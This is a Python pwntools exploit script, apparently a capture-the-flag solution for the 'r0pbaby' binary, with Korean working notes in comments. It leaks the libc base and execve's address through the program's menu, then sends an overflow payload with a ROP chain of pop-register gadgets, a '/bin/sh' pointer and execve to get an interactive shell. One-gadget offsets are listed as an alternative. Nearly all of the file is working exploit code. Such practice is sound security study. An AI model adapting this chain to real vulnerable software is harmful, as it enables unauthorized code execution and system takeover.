#! -*- coding: utf-8 -*-
from pwn import * 

p = process("./r0pbaby")

bin_offset = 0x1b3e9a
pop_rdi = 0x2155f	#pop rdi ; ret
pop_rsi = 0x23e6a	#pop rsi ; ret
pop_rdx = 0x01b96	#pop rdx ; ret
libc_offset = 0x80d4f0
one_gadget = [0x4f2c5,0x4f322,0x10a38c]

def getlibc():
	p.sendlineafter(": ","1")
	p.recvuntil("so.6: ")
	rcv = int(p.recv(),16)
	return rcv
	
def func(name):
	p.sendlineafter(": ","2")
	p.sendlineafter("symbol: ",name)
	p.recvuntil(": ")
	rcv = int(p.recv(18),16)
	return rcv

# 디버깅 방지, strip , pie 까지 골고루 걸려있는 문제. 
# 1 하면 lbic 베이스 주소 출력, 2하면 특정 함수의 주소를 출력, 3하면 버퍼 입력 들어감.
# ? 8바이트만 입력해도 ret가 덮인다. 뭐지 
# 필요한건 몇개 없어보인다. execve 주소도 받아올 수 있고, libc 주소 아니까 
# "/bin/sh" 도 찾아올 수 있다. 출력되는 libc는 실제 libc와는 약간의 차이 있음. 
# 아, 착각했다. 저렇게 찾은 가젯의 주소는 라이브러리에서 받아오는게 아니고
# 바이너리에 박혀있다. 라이브러리에서 가젯을 찾아와야 한다. 

if __name__ == "__main__" : 
	

	libc = getlibc()-libc_offset
	execve = func("execve")
	bin = libc+bin_offset
	p_rdi = libc+pop_rdi
	p_rsi = libc+pop_rsi
	p_rdx = libc+pop_rdx
	one = libc + one_gadget[1]
	
	log.info("libc : "+hex(libc)+"\nexecve: "+hex(execve)+"\npop: "+hex(p_rdi))
	
	p.sendlineafter(": ","3")
	
	payload =  "a"*8
	payload += p64(p_rdi) + p64(bin) + p64(p_rsi) + p64(0) 
	payload += p64(p_rdx) + p64(0) + p64(execve)
#	payload += p64(one)
#	64비트이기 때문에 원샷 가젯을 통한 풀이 가능. 
	
	p.sendlineafter(": ",str(len(payload)))
	
	pause()
	
	p.sendline(payload)
	#execve
	
	p.interactive()